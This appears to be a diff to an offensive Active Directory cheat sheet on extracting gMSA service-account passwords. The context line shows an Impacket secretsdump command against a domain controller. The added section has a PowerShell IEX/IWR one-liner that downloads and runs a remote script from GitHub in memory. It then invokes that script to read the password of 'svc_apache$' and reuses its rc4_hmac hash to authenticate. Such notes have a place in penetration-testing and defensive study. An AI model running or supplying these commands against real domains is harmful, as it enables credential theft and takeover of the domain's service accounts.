@@ -46,3 +46,13 @@
 #### 5) Impacket
 
     Impacket-secretsdump domain.local/USER1:Password@1@DC_IP | grep GMSA
+
+### 6) Invoke-GMSAPasswordReader
+
+    IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-GMSAPasswordReader/main/Invoke-GMSAPasswordReader.ps1')
+
+Read gMSA 
+
+    Invoke-GMSAPasswordREader -Command "--AccountName svc_apache$"
+
+Use rc4_hmac current value to authenticate
